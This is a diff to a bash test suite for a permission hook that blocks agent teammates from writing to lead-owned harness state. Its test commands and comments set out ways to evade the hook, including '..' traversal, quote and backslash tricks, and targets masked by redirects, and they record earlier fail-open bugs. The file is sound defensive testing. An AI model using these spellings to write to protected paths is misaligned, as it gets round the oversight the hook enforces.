 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp "-tsrc/other/d/" src/parser/a.txt')")
+  "$(bash_command_json 'cp "-t.harness/mld/d/" src/parser/a.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2 (F035): a fully-quoted attached '-tDIR' cp form exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2 (F035): quoted attached '-tDIR' denial uses JSON deny form"
-# Anchored on the leading quote in the denial message's "write to '...'" phrasing --
-# a plain substring check for "src/other/d/" also matches the WRONG value
-# "tsrc/other/d/" (round-2 review of PR #59, N2: this passed at 807/807 even with
-# the quote-skipping branch deleted entirely, or an off-by-one at the split point,
-# since both those broken helper outputs still contain "src/other/d/" as a tail).
-assert_contains "$OUT" "write to 'src/other/d/'" \
-  "hs2 (F035): quoted attached '-tDIR' denial names the real destination exactly, not the in-scope source"
+# The deny itself is the discriminator now (round-2 review of PR #59, N2, which
+# caught the old substring assertion passing even with the quote-skipping branch
+# deleted or off-by-one at the split point): an off-by-one extraction yields
+# "t.harness/mld/d/", which is NOT a lead-owned path and would be allowed, so
+# only the exact value can produce this denial.
 
 # F035 round 2 (PR #59 round-2 review, finding B1): an UNQUOTED attached "-t"
 # value containing a real backslash was a genuine fail-open -- extracting the
 # value from the VIEW (already-unquoted-and-unescaped) instead of the raw
-# token meant write_targets()'s later unquote_token() pass processed it a
-# SECOND time, which is not idempotent (F031). Ground-truthed against real
-# GNU cp: `gcp -ts\\rc/parser/x a.txt` (raw command text has two literal
-# backslash characters; bash's own outside-quotes escaping collapses that to
-# ONE backslash in the real argv) genuinely targets the literal directory
-# `s\rc/parser/x` -- confirmed by executing gcp directly and reading its own
-# "No such file or directory" error, which names that exact string. That is
-# NOT in scope (it doesn't start with "src/parser/" -- the char after "s" is
-# a literal backslash, not "r"). The old double-unquoting silently stripped
-# the surviving backslash and produced "src/parser/x", which looks in-scope
-# and was wrongly ALLOWED.
+# token meant write_targets()' later unquote_token() pass processed it a
+# SECOND time, which is not idempotent (F031). The observable direction flips
+# under OVI-144 Phase 3's lead-owned-only check: a path containing a real
+# backslash can never BE lead-owned, so it is the WRONG extraction that denies.
+# The raw command text below carries two literal backslash characters; bash's
+# own outside-quotes escaping collapses that to ONE in the real argv, so real
+# GNU cp targets the literal directory `.harness/ml\d/` (the same ground truth
+# as the old `s\rc/parser/x` case, confirmed by executing gcp directly and
+# reading the exact string in its "No such file or directory" error). That is
+# not a lead-owned path, hence ALLOW -- while double-unquoting strips the
+# surviving backslash, produces ".harness/mld/", and turns this into a false
+# DENY.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp -ts\\rc/parser/x src/parser/a.txt')")
+  "$(bash_command_json 'cp -t.harness/ml\\d/ src/parser/a.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F035 r2): backslash-bearing unquoted attached '-t' value exits 0 (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F035 r2): backslash-bearing unquoted attached '-t' denial uses JSON deny form"
-assert_contains "$OUT" 's\\rc/parser/x' \
-  "hs2 (F035 r2): denial names the real (single-unescaped) destination, not a double-unescaped decoy"
+assert_rc0 "$RC" "hs2 (F035 r2): backslash-bearing unquoted attached '-t' value passes, rc 0"
+assert_not_contains "$OUT" "permissionDecision" \
+  "hs2 (F035 r2): the real (single-unescaped) destination is checked, not a double-unescaped decoy"
 
 # F035 round 3 (PR #59 round-3 review, finding N1): the SAME double-unquoting
 # hazard as the -t case above, but on the sibling --target-directory= branch,
 # had ZERO mutation coverage -- reverting ONLY that branch to view-slicing
-# survived the full suite untouched. Ground-truthed against real GNU cp the
-# same way: `gcp --target-directory=s\\rc/parser/x a.txt` genuinely targets
-# the literal directory `s\rc/parser/x` (confirmed via gcp's own error
-# message), not the in-scope-looking `src/parser/x` double-unquoting would
-# produce.
+# survived the full suite untouched. Same shape and same ground truth: the
+# genuine destination keeps its backslash and is allowed, so only a
+# double-unescape can reach the lead-owned prefix and deny.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp --target-directory=s\\rc/parser/x src/parser/a.txt')")
+  "$(bash_command_json 'cp --target-directory=.harness/ml\\d/ src/parser/a.txt')")
 RC=$?
 assert_rc0 "$RC" \
-  "hs2 (F035 r3): backslash-bearing unquoted '--target-directory=' value exits 0 (JSON deny)"
-assert_deny_json "$OUT" \
-  "hs2 (F035 r3): backslash-bearing unquoted '--target-directory=' denial uses JSON deny form"
-assert_contains "$OUT" 's\\rc/parser/x' \
-  "hs2 (F035 r3): denial names the real (single-unescaped) destination, not a double-unescaped decoy"
+  "hs2 (F035 r3): backslash-bearing unquoted '--target-directory=' value passes, rc 0"
+assert_not_contains "$OUT" "permissionDecision" \
+  "hs2 (F035 r3): the real destination is checked, not a double-unescaped decoy"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'cp -t src/parser/ src/parser/a.txt src/parser/b.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: 'cp -t' with an in-scope destination passes, rc 0"
+assert_rc0 "$RC" "hs2: 'cp -t' with an ordinary destination passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2: in-scope 'cp -t' has no deny fields"
+  "hs2: ordinary 'cp -t' has no deny fields"
 
 # Regression: normal cp/mv (no -t) must still check only the DESTINATION
 # (the last flagless argument), not the source arguments -- a source read
-# from outside scope is not a write and must not be denied.
+# from a lead-owned path is not a write and must not be denied.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp src/other/source.txt src/parser/dest.txt')")
+  "$(bash_command_json 'cp .harness/mld/source.txt src/parser/dest.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: plain cp with an out-of-scope SOURCE and in-scope dest passes, rc 0"
+assert_rc0 "$RC" "hs2: plain cp with a lead-owned SOURCE and ordinary dest passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2: plain cp only checks the destination, not the source"
 
 # F024 round 1 review: the sed script-skip fix (round-1 fix) broke the
 # macOS/BSD sed -i idiom, which REQUIRES a backup-suffix argument (commonly
-# the empty string): `sed -i '' 's/.../ ' file` is in-scope, ordinary work on
+# the empty string): `sed -i '' 's/.../ ' file` is ordinary, everyday work on
 # this repo's own platform, but the round-1 fix's "skip exactly one leading
 # flagless token" heuristic skipped the empty-string suffix and misread the
 # real script as the file target, denying legitimate work.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "sed -i '' 's/a/b/' src/parser/a.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2: BSD-style 'sed -i ''' with an in-scope target passes, rc 0"
+assert_rc0 "$RC" "hs2: BSD-style 'sed -i ''' with an ordinary target passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2: BSD-style 'sed -i ''' does not misread the script as the file"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -i '' 's/a/b/' src/other/a.txt")")
+  "$(bash_command_json "sed -i '' 's/a/b/' .harness/mld/a.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2: BSD-style 'sed -i ''' with an out-of-scope target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: BSD-style 'sed -i ''' with a lead-owned target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: BSD-style 'sed -i ''' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/a.txt" \
-  "hs2: BSD-style 'sed -i ''' denial names the real file, not the script"
 
 # Multiple -e expressions: each one's value must be skipped, not misread as
 # a file target.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json "sed -i -e 's/a/b/' -e 's/c/d/' src/parser/a.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2: multi -e 'sed -i' with an in-scope target passes, rc 0"
+assert_rc0 "$RC" "hs2: multi -e 'sed -i' with an ordinary target passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2: multi -e 'sed -i' does not misread a later -e value as the file"
 
@@ -3552,96 +3437,88 @@ assert_not_contains "$OUT" "permissionDecision" \
 # script token to skip -- the sole flagless token is the real file and must
 # not be dropped.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json "sed -i --expression='s/a/b/' src/other/a.txt")")
+  "$(bash_command_json "sed -i --expression='s/a/b/' .harness/mld/a.txt")")
 RC=$?
-assert_rc0 "$RC" "hs2: 'sed -i --expression=' with an out-of-scope target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: 'sed -i --expression=' with a lead-owned target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: 'sed -i --expression=' denial uses JSON deny form"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'sed -i --file=script.sed src/other/a.txt')")
+  "$(bash_command_json 'sed -i --file=script.sed .harness/mld/a.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: 'sed -i --file=' with an out-of-scope target exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: 'sed -i --file=' with a lead-owned target exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: 'sed -i --file=' denial uses JSON deny form"
 
 # F024 round 1 review: write_targets() only checked ONE extractor category
 # per segment (redirect targets OR command-type targets, whichever fired
 # first), so a segment with BOTH a real write command and an unrelated
 # trailing redirect only ever had its redirect target checked -- the
-# command's own real target (out of scope) went uncaught, the exact
+# command's own real target (lead-owned) went uncaught, the exact
 # multi-target-masking shape F024 exists to close, just across extractor
 # categories instead of within one.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'tee src/other/a.txt > src/parser/log.txt')")
+  "$(bash_command_json 'tee .harness/mld/a.txt > src/parser/log.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2: tee target masked by a trailing redirect still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: tee-plus-redirect denial uses JSON deny form"
-assert_contains "$OUT" "src/other/a.txt" \
-  "hs2: tee-plus-redirect denial names the tee target, not just the redirect"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'rm src/other/a.txt > src/parser/log.txt')")
+  "$(bash_command_json 'rm .harness/mld/a.txt > src/parser/log.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2: rm target masked by a trailing redirect still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: rm-plus-redirect denial uses JSON deny form"
-assert_contains "$OUT" "src/other/a.txt" \
-  "hs2: rm-plus-redirect denial names the rm target, not just the redirect"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp -t src/other/ src/parser/a.txt > src/parser/log.txt')")
+  "$(bash_command_json 'cp -t .harness/mld/ src/parser/a.txt > src/parser/log.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2: 'cp -t' destination masked by a trailing redirect still exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: 'cp -t'-plus-redirect denial uses JSON deny form"
-assert_contains "$OUT" "src/other/" \
-  "hs2: 'cp -t'-plus-redirect denial names the -t destination, not just the redirect"
 
-# No new false positive: a write command plus an in-scope trailing redirect,
-# both in scope, must still pass cleanly.
+# No new false positive: a write command plus an ordinary trailing redirect,
+# both ordinary, must still pass cleanly.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'tee src/parser/a.txt > src/parser/log.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: all-in-scope tee-plus-redirect passes, rc 0"
+assert_rc0 "$RC" "hs2: all-ordinary tee-plus-redirect passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2: all-in-scope tee-plus-redirect has no deny fields"
+  "hs2: all-ordinary tee-plus-redirect has no deny fields"
 
 # F024 round 2 review: strip_redirects()'s >>?\s*[^\s<>|&;]+ regex removed
 # the operator and its target but not a preceding file-descriptor digit
 # (2>, 1>), leaving a stray digit token that the command extractors (which
 # now always run, per round 1's fix) misread as a real write target -- an
-# all-in-scope command was wrongly denied naming the bare digit.
+# all-ordinary command was wrongly denied naming the bare digit.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'rm src/parser/a.txt 2> src/parser/err.log')")
 RC=$?
-assert_rc0 "$RC" "hs2: fd-prefixed redirect (space form) with all in-scope targets passes, rc 0"
+assert_rc0 "$RC" "hs2: fd-prefixed redirect (space form) with all ordinary targets passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2: fd-prefixed redirect (space form) does not leave a stray digit target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'rm src/parser/a.txt 2>src/parser/err.log')")
 RC=$?
-assert_rc0 "$RC" "hs2: fd-prefixed redirect (no-space form) with all in-scope targets passes, rc 0"
+assert_rc0 "$RC" "hs2: fd-prefixed redirect (no-space form) with all ordinary targets passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2: fd-prefixed redirect (no-space form) does not leave a stray digit target"
 
 # Caution (per review): a naive digit-prefix strip must NOT truncate a real
 # argument that merely ENDS in a digit immediately before an UNPREFIXED
 # redirect operator, with NO separating space -- no fd semantics at all here
-# ("src/other/version2" is one whole word, not "just digits", so per real
+# (".harness/features.json2" is one whole word, not "just digits", so per real
 # bash it is NOT an fd number; `echo abc2> out` writes "abc2", not "abc").
 # The fd-prefix rule only applies when the digit run is its OWN complete
-# token (whitespace or start-of-segment immediately before it). Uses an
-# OUT-OF-SCOPE target specifically so truncation is observable in the
-# denial message: an all-in-scope version can't discriminate, since a
-# naively truncated "version" is still in scope right alongside the correct
-# "version2" (found by adversarial review of PR #46, round 4 -- the
-# round-3 version of this test used an all-in-scope target and could not
-# actually tell a truncating regex apart from a correct one).
+# token (whitespace or start-of-segment immediately before it). The target is
+# chosen so truncation is observable: ".harness/features.json2" is an ordinary
+# file and must be allowed, while the naively truncated ".harness/features.json"
+# is lead-owned and would deny -- a target where both readings land on the same
+# verdict can't tell a truncating regex apart from a correct one (found by
+# adversarial review of PR #46, round 4, which caught exactly that).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'rm src/other/version2> src/parser/log.txt')")
+  "$(bash_command_json 'rm .harness/features.json2> src/parser/log.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: an out-of-scope target ending in a digit, no-space unprefixed redirect, denies"
-assert_deny_json "$OUT" "hs2: out-of-scope digit-ending-target denial uses JSON deny form"
-assert_contains "$OUT" "src/other/version2" \
-  "hs2: the digit at the end of the real filename is not truncated off"
+assert_rc0 "$RC" "hs2: an ordinary target ending in a digit, no-space unprefixed redirect, passes"
+assert_not_contains "$OUT" "permissionDecision" \
+  "hs2: the digit at the end of the real filename is not truncated off into a lead-owned path"
 
 # F024 round 3 review: anchoring the ENTIRE match (not just the optional
 # digit run) to a token boundary made a BARE ">" (no fd prefix at all) fail
@@ -3651,40 +3528,36 @@ assert_contains "$OUT" "src/other/version2" \
 # through to the unstripped trailing text, picking the redirect's own target
 # instead of the real destination -- reintroducing F024's own masking bug.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'cp src/parser/a.txt src/other/b.txt> src/parser/log.txt')")
+  "$(bash_command_json 'cp src/parser/a.txt .harness/mld/b.txt> src/parser/log.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: cp with a no-space '>' glued to an out-of-scope destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: cp with a no-space '>' glued to a lead-owned destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: cp no-space-'>' denial uses JSON deny form"
-assert_contains "$OUT" "src/other/b.txt" \
-  "hs2: cp no-space-'>' denial names the real destination, not the redirect's target"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'mv src/parser/a.txt src/other/b.txt> src/parser/log.txt')")
+  "$(bash_command_json 'mv src/parser/a.txt .harness/mld/b.txt> src/parser/log.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: mv with a no-space '>' glued to an out-of-scope destination exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: mv with a no-space '>' glued to a lead-owned destination exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: mv no-space-'>' denial uses JSON deny form"
 
-# No new false positive: the same no-space-'>' shape, all in scope, must
+# No new false positive: the same no-space-'>' shape, all ordinary, must
 # still pass cleanly.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'cp src/parser/a.txt src/parser/b.txt> src/parser/log.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: all-in-scope cp with a no-space '>' passes, rc 0"
+assert_rc0 "$RC" "hs2: all-ordinary cp with a no-space '>' passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2: all-in-scope cp no-space-'>' has no deny fields"
+  "hs2: all-ordinary cp no-space-'>' has no deny fields"
 
-# F026: normalize() strips the project-root prefix but never resolves ".."
-# path traversal, so a write target that escapes the allowed directory via
-# traversal still matches the allowed prefix under a bare .startswith()
-# check. Verified in real bash: `echo x > src/parser/../other/x.txt`
-# actually writes to src/other/x.txt, outside the "src/parser/" scope.
+# F026: normalize() strips the project-root prefix but never resolved ".."
+# path traversal, so a write target that reaches lead-owned state through a
+# traversal was compared as the literal, unresolved string and never matched.
+# Verified in real bash: `echo x > src/parser/../../.harness/mld/x.txt` actually
+# writes to .harness/mld/x.txt.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'echo x > src/parser/../other/x.txt')")
+  "$(bash_command_json 'echo x > src/parser/../../.harness/mld/x.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: a '..'-traversal escaping scope exits 0 (JSON deny)"
+assert_rc0 "$RC" "hs2: a '..'-traversal into lead-owned state exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: traversal denial uses JSON deny form"
-assert_contains "$OUT" "src/other/x.txt" \
-  "hs2: traversal denial names the real, resolved out-of-scope path"
 
 # The same gap under quoting (unquote_token, added by F023, means these
 # spellings now reach the traversal unresolved rather than being
@@ -3695,40 +3568,36 @@ assert_contains "$OUT" "src/other/x.txt" \
 # denied" confusion this comment describes) and the assertion wouldn't
 # notice (found by adversarial review of PR #48, round 1).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'echo x > "src/parser/"../other/x.txt')")
+  "$(bash_command_json 'echo x > "src/parser/"../../.harness/mld/x.txt')")
 RC=$?
 assert_rc0 "$RC" "hs2: a quoted-prefix '..'-traversal exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: quoted-prefix traversal denial uses JSON deny form"
-assert_contains "$OUT" "src/other/x.txt" \
-  "hs2: quoted-prefix traversal denial names the real, resolved path"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'echo x > "src/parser/../other/x.txt"')")
+  "$(bash_command_json 'echo x > "src/parser/../../.harness/mld/x.txt"')")
 RC=$?
 assert_rc0 "$RC" "hs2: a fully-quoted '..'-traversal exits 0 (JSON deny)"
 assert_deny_json "$OUT" "hs2: fully-quoted traversal denial uses JSON deny form"
-assert_contains "$OUT" "src/other/x.txt" \
-  "hs2: fully-quoted traversal denial names the real, resolved path"
 
-# No new false positive: a "." or ".." segment that resolves back INSIDE
-# the allowed scope must still pass (e.g. a round-trip through a
-# subdirectory, or a redundant "./").
+# No new false positive: a "." or ".." segment that resolves back to an
+# ordinary path must still pass (e.g. a round-trip through a subdirectory,
+# or a redundant "./").
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'echo x > src/parser/sub/../ok.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: a '..'-traversal that resolves back in-scope passes, rc 0"
+assert_rc0 "$RC" "hs2: a '..'-traversal that resolves back ordinary passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
-  "hs2: an in-scope-resolving traversal has no deny fields"
+  "hs2: an ordinary-resolving traversal has no deny fields"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'echo x > src/parser/./ok.txt')")
 RC=$?
-assert_rc0 "$RC" "hs2: a redundant './' segment resolving in-scope passes, rc 0"
+assert_rc0 "$RC" "hs2: a redundant './' segment resolving ordinary passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2: a redundant './' segment has no deny fields"
 
-# The lead-owned state-file guard must also resolve traversal, not just the
-# scope-prefix check -- both read the same normalize() output.
+# The Bash-command path must resolve traversal before the lead-owned
+# comparison, the same normalize() output the Edit/Write path reads.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'echo x > src/parser/../../.harness/features.json')")
 RC=$?
@@ -3736,21 +3605,13 @@ assert_rc0 "$RC" "hs2: a '..'-traversal into a lead-owned state file exits 0 (JS
 assert_contains "$OUT" "lead-owned" \
   "hs2: traversal-to-lead-owned denial names the invariant"
 
-# F026 round 1 review: the Edit/Write/MultiEdit legacy path (FILE_PATH,
-# handled entirely in bash before the Bash-command Python script ever
-# runs) has the SAME missing-traversal-resolution bug as normalize() did --
-# it strips the project-root prefix but never resolves ".."/"." segments,
-# and it is the MORE authoritative gate (Edit/Write tool calls, not the
-# best-effort Bash coverage). A teammate scoped to "src/parser/" could
-# traverse out via Edit even after the Bash-side fix (found by adversarial
-# review of PR #48).
-OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(edit_json "$DIR_HS/src/parser/../other/y.py")" 2>&1)
-RC=$?
-assert_rc2 "$RC" "hs2: Edit with a '..'-traversal escaping scope is blocked (legacy exit 2)"
-assert_contains "$OUT" "src/other/y.py" \
-  "hs2: Edit traversal block message names the real, resolved out-of-scope file"
-
+# F026 round 1 review: the Edit/Write/MultiEdit path (FILE_PATH, resolved
+# before the Bash-command Python script ever runs) has the SAME missing-
+# traversal-resolution bug as normalize() did -- it strips the project-root
+# prefix but never resolved ".."/"." segments, and it is the MORE
+# authoritative gate (Edit/Write tool calls are blocked outright, unlike the
+# best-effort Bash coverage), so a traversal into lead-owned state had to be
+# resolved here too (found by adversarial review of PR #48).
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(edit_json "$DIR_HS/src/parser/../../.harness/features.json")")
 RC=$?
@@ -3762,52 +3623,64 @@ assert_contains "$OUT" "lead-owned" \
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(edit_json "$DIR_HS/src/parser/sub/../ok.py")")
 RC=$?
-assert_rc0 "$RC" "hs2: Edit with a '..'-traversal that resolves back in-scope passes, rc 0"
+assert_rc0 "$RC" "hs2: Edit with a '..'-traversal that resolves back ordinary passes, rc 0"
 
 # F026 round 2 review: routing FILE_PATH's prefix-strip through Python's
 # literal str.startswith() (rather than the old bash `${FILE_PATH#$PROJECT_ROOT/}`,
 # which used UNQUOTED $PROJECT_ROOT in bash pattern-match position) fixed an
 # unadvertised pre-existing false positive: a project root whose path
 # contains a shell glob metacharacter (e.g. "[1]") broke the old bash
-# substring-stripping, wrongly blocking an in-scope edit. Locking it in with
+# substring-stripping, wrongly blocking an ordinary edit. Locking it in with
 # a dedicated fixture whose path contains such a character.
-DIR_HS_GLOBROOT="$WORK/ht-scope-root[1]"
-make_fixture "$DIR_HS_GLOBROOT"
-install_hooks "$DIR_HS_GLOBROOT"
-printf 'src/parser/\n' > "$DIR_HS_GLOBROOT/.claude/teammate-scope.txt"
+DIR_HS_GLOBROOT_MAIN="$WORK/ht-scope-root[1]"
+make_worktree_fixture "$DIR_HS_GLOBROOT_MAIN"
+DIR_HS_GLOBROOT="$DIR_HS_GLOBROOT_MAIN-wt"
 OUT=$(run_hook "$DIR_HS_GLOBROOT" enforce-scope.sh \
   "$(edit_json "$DIR_HS_GLOBROOT/src/parser/x.py")")
 RC=$?
-assert_rc0 "$RC" "hs2: an in-scope edit under a glob-metacharacter project root passes, rc 0"
+assert_rc0 "$RC" "hs2: an ordinary edit under a glob-metacharacter project root passes, rc 0"
+assert_not_contains "$OUT" "permissionDecision" \
+  "hs2: glob-metacharacter project root produces no deny fields for an ordinary edit"
 
-# F030: /dev/null (and other /dev/* special files) never matches any
-# teammate scope pattern, so the extremely common `cmd 2>/dev/null` idiom
-# was denied naming '/dev/null' as an out-of-scope write, even when every
-# real target in the command was in scope. Confirmed pre-existing on main.
+# The same root, deny direction: the prefix strip has to actually work for the
+# lead-owned comparison to see ".harness/features.json" rather than the whole
+# absolute path, so an allow here would be indistinguishable from a broken
+# strip if it were the only assertion.
+OUT=$(run_hook "$DIR_HS_GLOBROOT" enforce-scope.sh \
+  "$(edit_json "$DIR_HS_GLOBROOT/.harness/features.json")")
+RC=$?
+assert_rc0 "$RC" "hs2: a lead-owned edit under a glob-metacharacter project root exits 0 (JSON deny)"
+assert_deny_json "$OUT" "hs2: the project-root prefix strip survives a glob metacharacter"
+
+# F030: /dev/null (and other /dev/* special files) matched no teammate scope
+# pattern, so the extremely common `cmd 2>/dev/null` idiom was denied naming
+# '/dev/null' as a write outside scope, even when every real target in the
+# command was allowed. The per-pattern comparison that made that a false
+# positive retired with OVI-144 Phase 3 (/dev/null is simply not lead-owned),
+# but the idiom stays pinned here in both directions: the redirect must not
+# swallow, or excuse, a real lead-owned target elsewhere in the segment.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'cp src/parser/a.txt src/parser/b.txt 2>/dev/null')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F030): an all-in-scope cp with a 2>/dev/null redirect passes, rc 0"
+assert_rc0 "$RC" "hs2 (F030): an all-ordinary cp with a 2>/dev/null redirect passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2 (F030): 2>/dev/null redirect has no deny fields"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'rm src/parser/a.txt 2>/dev/null')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F030): an all-in-scope rm with a 2>/dev/null redirect passes, rc 0"
+assert_rc0 "$RC" "hs2 (F030): an all-ordinary rm with a 2>/dev/null redirect passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2 (F030): rm with 2>/dev/null has no deny fields"
 
-# An out-of-scope target elsewhere in the same command must still be caught
+# An lead-owned target elsewhere in the same command must still be caught
 # -- the /dev/null exemption must not become a blanket pass for the whole
 # segment.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'rm src/other/a.txt 2>/dev/null')")
+  "$(bash_command_json 'rm .harness/mld/a.txt 2>/dev/null')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F030): an out-of-scope rm target is still caught alongside 2>/dev/null (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F030): out-of-scope-plus-devnull denial uses JSON deny form"
-assert_contains "$OUT" "src/other/a.txt" \
-  "hs2 (F030): out-of-scope-plus-devnull denial names the real target, not /dev/null"
+assert_rc0 "$RC" "hs2 (F030): a lead-owned rm target is still caught alongside 2>/dev/null (JSON deny)"
+assert_deny_json "$OUT" "hs2 (F030): lead-owned-plus-devnull denial uses JSON deny form"
 
 # F030 (second, unrelated root cause): segments_of() splits on any literal
 # '&', including the one glued to '>' in the fd-duplication idiom `2>&1`
@@ -3820,69 +3693,61 @@ assert_contains "$OUT" "src/other/a.txt" \
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'rm src/parser/a.txt 2>&1')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F030): an all-in-scope rm with a 2>&1 redirect passes, rc 0"
+assert_rc0 "$RC" "hs2 (F030): an all-ordinary rm with a 2>&1 redirect passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2 (F030): rm with 2>&1 has no deny fields"
 
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
   "$(bash_command_json 'cp src/parser/a.txt src/parser/b.txt 2>&1')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F030): an all-in-scope cp with a 2>&1 redirect passes, rc 0"
+assert_rc0 "$RC" "hs2 (F030): an all-ordinary cp with a 2>&1 redirect passes, rc 0"
 assert_not_contains "$OUT" "permissionDecision" \
   "hs2 (F030): cp with 2>&1 has no deny fields"
 
-# The '2>&1' idiom must not become a way to smuggle a real out-of-scope
-# target past detection -- a genuine out-of-scope target elsewhere in the
+# The '2>&1' idiom must not become a way to smuggle a real lead-owned
+# target past detection -- a genuine lead-owned target elsewhere in the
 # same command must still be caught.
 OUT=$(run_hook "$DIR_HS" enforce-scope.sh \
-  "$(bash_command_json 'rm src/other/a.txt 2>&1')")
+  "$(bash_command_json 'rm .harness/mld/a.txt 2>&1')")
 RC=$?
-assert_rc0 "$RC" "hs2 (F030): an out-of-scope rm target is still caught alongside 2>&1 (JSON deny)"
-assert_deny_json "$OUT" "hs2 (F030): out-of-scope-plus-2>&1 denial uses JSON deny form"
-assert_contains "$OUT" "src/other/a.txt" \
-  "hs2 (F030): out-of-scope-plus-2>&1 denial names the real target, not a redirect fragment"
+assert_rc0 "$RC" "hs2 (F030): a lead-owned rm target is still caught alongside 2>&1 (JSON deny)"
+assert_deny_json "$OUT" "hs2 (F030): lead-owned-plus-2>&1 denial uses JSON deny form"
 
 # F036 (discovered_via F030): `>&word` with word NOT purely digits/"-" is an
 # ordinary FILE redirect in real bash (`&>word`), not fd-duplication --
 # confirmed against real bash: `echo HELLO >&outfile.txt` genuinely creates
 # outfile.txt. redirect_targets()'s char class explicitly excludes "&", so it
